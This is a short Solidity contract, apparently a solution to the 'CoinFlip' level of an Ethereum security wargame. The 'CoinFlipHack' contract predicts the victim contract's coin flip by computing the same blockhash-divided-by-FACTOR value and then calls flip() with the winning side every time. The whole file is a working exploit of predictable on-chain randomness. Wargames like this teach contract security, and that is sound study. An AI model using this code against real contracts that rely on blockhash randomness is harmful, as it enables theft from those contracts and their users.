pragma solidity ^0.8.0;

import 'levels/CoinFlip.sol';

contract CoinFlipHack {
  CoinFlip public victimContract;

  constructor(address coinFlipAddress) {
    victimContract = CoinFlip(coinFlipAddress);
  }

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function hack() external {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    victimContract.flip(side);
  }
}
